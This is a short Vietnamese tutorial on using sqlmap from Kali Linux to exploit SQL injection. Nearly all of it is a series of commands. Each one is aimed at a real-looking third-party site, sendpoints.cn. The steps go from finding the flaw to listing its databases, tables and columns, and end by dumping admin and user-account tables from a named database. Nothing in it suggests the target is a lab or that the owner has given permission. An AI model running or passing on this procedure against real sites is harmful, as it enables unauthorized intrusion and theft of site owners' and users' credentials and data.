## SQL injection sử dụng tools sqlmap trên kali
- quét lỗ hổng sql: `sqlmap -u *"url của đối tượng cần quét"*`. Ví dụ: `sqlmap -u "http://www.sendpoints.cn/publication_detail.php?id=267&cId=0002.0001.0000.0000"` url có dạng `index.php?id=`
- sau khi xác định có lỗ hổng sql ta có thể tiến hành lấy database của đối tượng
- lấy database: `sqlmap -u *"url của đối tượng cần quét"* --dbs`. Ví dụ `sqlmap -u "http://www.sendpoints.cn/publication_detail.php?id=267&cId=0002.0001.0000.0000" --dbs`
- sau khi lấy được danh sách các database có thể lấy được ta tiến hành lấy các bảng trong database đó
- Lấy danh sách bảng: `sqlmap -u *"url của đối tượng cần quét"* --table -D *tên database cần lấy*`. Ví dụ: `sqlmap -u "http://www.sendpoints.cn/publication_detail.php?id=267&cId=0002.0001.0000.0000" --table -D hkhostco_spen`
- sau khi lấy được danh sách bảng ta có thể lấy thông tin các cột có trong danh sách đó
- Lấy danh sách cột: `sqlmap -u *"url của đối tượng cần quét"* --columns -T *tên cột cần lấy* -D *tên database cần lấy*`. Ví dụ: `sqlmap -u "http://www.sendpoints.cn/publication_detail.php?id=267&cId=0002.0001.0000.0000" --columns -T ltt_useraccount -D hkhostco_spen`
- sau khi lấy được danh sách các cột, ta có thể lấy nội dung của các cột đó
- Lấy nội dung các cột: `sqlmap -u *"url của đối tượng cần quét"* --dump -T *tên cột cần lấy* -D *tên database cần lấy*`. Ví dụ: `sqlmap -u "http://www.sendpoints.cn/publication_detail.php?id=267&cId=0002.0001.0000.0000" --dump -T ltt_admin -D hkhostco_spen`
